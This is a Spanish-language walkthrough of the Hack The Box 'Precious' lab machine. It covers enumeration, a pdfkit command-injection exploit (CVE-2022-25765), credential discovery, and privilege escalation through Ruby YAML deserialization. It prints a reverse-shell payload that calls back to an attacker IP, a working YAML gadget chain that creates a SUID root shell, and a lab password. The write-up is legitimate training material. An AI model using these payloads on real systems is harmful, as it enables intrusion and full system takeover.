# Precious

![](../../../../~gitbook/image.md)Publicado: 05 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Precious es una máquina Linux de dificultad fácil en Hack The Box que presenta una aplicación web que convierte URLs en archivos PDF. La explotación inicial se basa en una vulnerabilidad de inyección de comandos (CVE-2022-25765) en la librería pdfkit v0.8.7.2, que permite la ejecución remota de código a través de parámetros mal sanitizados en la URL de entrada.Una vez dentro del sistema, se encuentra credenciales hardcodeadas en archivos de configuración de Ruby que permiten el movimiento lateral al usuario henry. La escalada de privilegios se logra explotando una vulnerabilidad de deserialización YAML en un script Ruby que henry puede ejecutar como root sin contraseña, permitiendo la ejecución de código arbitrario con privilegios administrativos.
###🏷️ Categorías
- 🌐 Web Application Security: Análisis y explotación de aplicaciones web
- 💉 Command Injection: CVE-2022-25765 en pdfkit
- 🔐 Credential Discovery: Búsqueda de credenciales en archivos de configuración
- ⬆️ Privilege Escalation: Escalada mediante deserialización YAML
- 🐍 Ruby/YAML Exploitation: Explotación de vulnerabilidades específicas de Ruby
- 📄 PDF Generation: Aplicaciones de conversión de contenido web a PDF
- 🔍 Information Gathering: Reconocimiento y enumeración de servicios
- 🏃 Lateral Movement: Movimiento entre usuarios del sistema

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####80 HTTP (http://precious.htb/)
Al acceder a http://precious.htb/ encontramos un sitio web que permite converter una web que introduzcamos introduciendo una url a formato PDF![](../../../../~gitbook/image.md)🕷️Fuzzing de directoriosRealizamos fuzzing de directorios con herramientas como feroxbuster o dirsearch pero no obtenemos ningún resultado:🕷️Fuzzing de vhostsTampoco encontramos ningún vhost
####🧪 Probando la aplicación
Dado que la aplicación espera una URL para convertirla a formato pdf, probamos algunos payloads como file:///etc/passwd http://127.0.0.1 pero son bloqueados.![](../../../../~gitbook/image.md)Si introducimos una URL válida como http://www.google.es e interceptamos la petición con burp enueramos que el servidor está usando Phusion Passenger(R) 6.0.15 y Ruby.![](../../../../~gitbook/image.md)Ahora probamos a levantar un servidor web en python en nuestro host de ataque y hacemos una petición al mismo.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Y comprobamos que genera y descarga el pdf con el contenido:![](../../../../~gitbook/image.md)Ahora que hemos descargado el PDF, echamos un vistazo a los metadatos del mismo. Usamos por ejemplo la herramienta exiftool y logramos enumerar la herramienta usada para su generación:![](../../../../~gitbook/image.md)Si no tenemos exiftool también podemos enumerar esta información en las propiedades del documento usando algún lector de pdf:![](../../../../~gitbook/image.md)
####🚪 Acceso Inicial - Explotación

####CVE-2022–25765
pdfkit v0.8.7.2 - Command InjectionBuscamos si hay algún exploit pública para para esa versión de la herramienta y encontramos un candidato:![](../../../../~gitbook/image.md)El exploit abusa de una mala sanitización del campo de entrada URL y explota una vulnerabilidad de inyección de comandos. Tras leer la documentación de la vulnerabilidad, parece que podemos inyectar comandos en el campo de entrada añadiendo `?name=%20`en la solicitud una solicitud HTTP GET con un parámetro `name`Ejemplo:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)La PoC funciona, así que ahora intentemos obtener una RCE usando el siguiente payload:![](../../../../~gitbook/image.md)Y ganamos acceso a la máquina![](../../../../~gitbook/image.md)Enumeramos la máquina y encontramos dos usuariosNo tenemos permisos para leer la flag así que continuamos enumerando la máquina y encontramos un fichero de configuración en el directorio del usuario henry que podría ser una contraseña:Logramos autenticarnos como henry y obtener la primera flag
####🔑 Escalada de privilegios
Buscamos ahora vías potenciales de escalada a root y lo hacemos comenzando por revisar si henry puede ejecutar algún comando o binario como sudo:Observamos que hay un script en ruby que henry puede ejecutar como root sin que la contraseña sea solicitada. Comprobamos los permisos que tiene henry sobre dicho script y vemos que puede leer y ejecutar:Si tratamos de ejecutarlo obtenemos un error:Analicemos un poco el contenido del scriptEsta línea es crítica: `YAML.load` ya que ejecuta código Ruby arbitrario si se le da un archivo `.yml` malicioso. Es un YAML deserialisation vulnerability muy conocido en Ruby.[Este resumen](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) presenta un ejemplo muy claro y conciso de una carga útil que puede usarse para explotar la deserialización de YAML en Ruby. Se basa en este [artículo mucho más extenso y detallado](https://www.elttam.com.au/blog/ruby-deserialization/)Para abusar de esto creamos un archivo dependencies.yml con el siguiente contenido en /dev/shm:Este payload lo que hará será crear una copia de /bin/bash en el directorio tmp con el nombre x3m1sec y le otorgará SUID. A continuación se muestra el archivo generado:![](../../../../~gitbook/image.md)Ahora simplemente nos quedaría elevar privilegios haciendo uso de la flag -p y escalamos a root:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🏷️ Categorías](#categorias)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.11.189
PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=42.9 ms
64 bytes from 10.10.11.189: icmp_seq=2 ttl=63 time=42.3 ms

--- 10.10.11.189 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 42.274/42.569/42.864/0.295 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.189 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.189 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 08:02 CEST
Nmap scan report for 10.10.11.189
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://10.10.11.189 -r  -w /usr/share/seclists/Discovery/Web-Content/common.txt --scan-dir-listings -C 503 -x php,xml
```

```
dirsearch -u http://10.10.11.189 -x 503
```

```
ffuf -u http://10.10.11.189 -H "Host: FUZZ.precious.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -mc all -fs 145
```

```
python3 -m http.server 80
```

```
exiftool vu6ga0mfas1cqde0e0y5gxl30w07mva5.pdf
```

```
http://10.10.14.3/?name=%20`id`
```

```
http://10.10.14.6/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.3/443 0>&1"`
```

```
ruby@precious:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 Oct 26  2022 .
drwxr-xr-x 18 root  root  4096 Nov 21  2022 ..
drwxr-xr-x  2 henry henry 4096 Oct 26  2022 henry
drwxr-xr-x  4 ruby  ruby  4096 Jun  5 02:04 ruby
ruby@precious:/home$ cd henry
ruby@precious:/home/henry$ cat user.txt
cat: user.txt: Permission denied
```

```
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
ruby@precious:~/.bundle$
```

```
ruby@precious:~/.bundle$ su henry
Password: Q3c1AqGHtoI0aXAYFH
henry@precious:/home/ruby/.bundle$ whoami
henry
```

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$
```

```
henry@precious:~$ ls -la /opt/update_dependencies.rb
-rwxr-xr-x 1 root root 848 Sep 25  2022 /opt/update_dependencies.rb
```

```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
Traceback (most recent call last):
2: from /opt/update_dependencies.rb:17:in `'
1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
```

```
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
gems_local.each do |local_name, local_version|
if(file_name == local_name)
if(file_version != local_version)
puts "Installed version differs from the one specified in file: " + local_name
else
puts "Installed version is equals to the one specified in file: " + local_name
end
end
end
end
```

```
---
- !ruby/object:Gem::Installer
i: x
- !ruby/object:Gem::SpecFetcher
i: y
- !ruby/object:Gem::Requirement
requirements:
!ruby/object:Gem::Package::TarReader
io: &1 !ruby/object:Net::BufferedIO
io: &1 !ruby/object:Gem::Package::TarReader::Entry
read: 0
header: "abc"
debug_output: &1 !ruby/object:Net::WriteAdapter
socket: &1 !ruby/object:Gem::RequestSet
sets: !ruby/object:Net::WriteAdapter
socket: !ruby/module 'Kernel'
method_id: :system
git_set: cp /bin/bash /tmp/x3m1sec; chmod 6777 /tmp/x3m1sec
method_id: :resolve
```

```
henry@precious:/dev/shm$ cd /tmp
henry@precious:/tmp$ ./x3m1sec -p
x3m1sec-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
x3m1sec-5.1#
```
